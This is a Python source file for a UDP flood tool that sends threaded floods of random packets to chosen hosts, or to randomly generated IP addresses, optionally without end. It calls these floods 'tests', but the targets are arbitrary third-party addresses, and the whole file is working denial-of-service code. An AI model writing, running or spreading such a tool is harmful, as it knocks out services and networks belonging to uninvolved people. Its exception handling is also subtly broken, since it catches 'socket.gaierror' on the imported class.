import logging
from colorama import Fore  # For terminal colors
from random import _urandom  # To generate random bytes
from socket import socket, AF_INET, SOCK_DGRAM, gethostbyname  # For network connections
from threading import Thread  # To create threads

from modules.generate_random_ip.generate_random_ip import generate_ip  # To generate random IP

class DDoSAttack:
    """
    Handles DDoS attacks on randomly generated IPs.
    """

    @staticmethod
    def perform_ip_attack(door, quantity_ips, quantity_packages):
        """
        Performs DDoS tests on randomly generated IPs.
        Args:
            door (int): Target port.
            quantity_ips (int): Number of IPs to attack.
            quantity_packages (int): Number of packets to send per attack.
        """
        for i in range(quantity_ips):
            ip = generate_ip.generate_random_ip()
            try:
                logging.info(f"Testing attack on IP: {ip}, Port: {door}, Packets: {quantity_packages}")
                print(Fore.YELLOW + f"Testing attack on IP: {ip}, Port: {door}, Packets: {quantity_packages}")
                DDoSAttack.main_ddos(ip, door, quantity_packages)
                logging.info(f"IP attack {ip} successfully completed.")
            except Exception as e:
                logging.error(f"Error attacking IP {ip}: {e}")
                print(Fore.RED + f"Error attacking IP {ip}: {e}")

        logging.info("Tests completed. Report generated in relatorio.log.")
        print(Fore.CYAN + "Tests completed. Report generated in relatorio.log.")

    @staticmethod
    def main_ddos(hostname, door, quantidade):
        """
        Configures and executes the DDoS attack on the specified target.
        Args:
            hostname (str): Target hostname or IP.
            door (int): Target port.
            quantidade (int): Number of packets to send.
        """
        if not hostname or not door:
            print(Fore.RED + "Invalid entry. Closing...")
            return

        try:
            ip = gethostbyname(hostname)
            target = (ip, door)
            print(Fore.YELLOW + f"Initiating attack on target {target[0]}:{target[1]}")
            bytes = _urandom(1490)

            threads = []
            num_threads = 5

            for _ in range(num_threads):
                thread = Thread(target=DDoSAttack.execute_attack, args=(target, bytes, quantidade))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            print(Fore.CYAN + "Attack completed")
        except socket.gaierror:
            print(Fore.RED + "Invalid hostname. Could not resolve IP.")
        except Exception as e:
            print(Fore.RED + f"A general error has occurred: {e}")

    @staticmethod
    def execute_attack(target, bytes, quantidade):
        """
        Sends packets to the specified target.
        Args:
            target (tuple): Target IP and port.
            bytes (bytes): Data to send.
            quantidade (int): Number of packets to send.
        """
        sock = socket(AF_INET, SOCK_DGRAM)
        sent_packages = 0

        try:
            if quantidade == 0:
                print(Fore.YELLOW + "Attacking indefinitely... press Ctrl+C to stop")
                while True:
                    sock.sendto(bytes, target)
                    sent_packages += 1
                    print(Fore.GREEN + f"Package sent... total: {sent_packages}")
            else:
                for _ in range(quantidade):
                    sock.sendto(bytes, target)
                    sent_packages += 1
                    print(Fore.GREEN + f"Package sent... total: {sent_packages}")
        except KeyboardInterrupt:
            print(Fore.CYAN + "Attack interrupted by user")
        except Exception as e:
            print(Fore.RED + f"Error during attack: {e}")
        finally:
            sock.close()
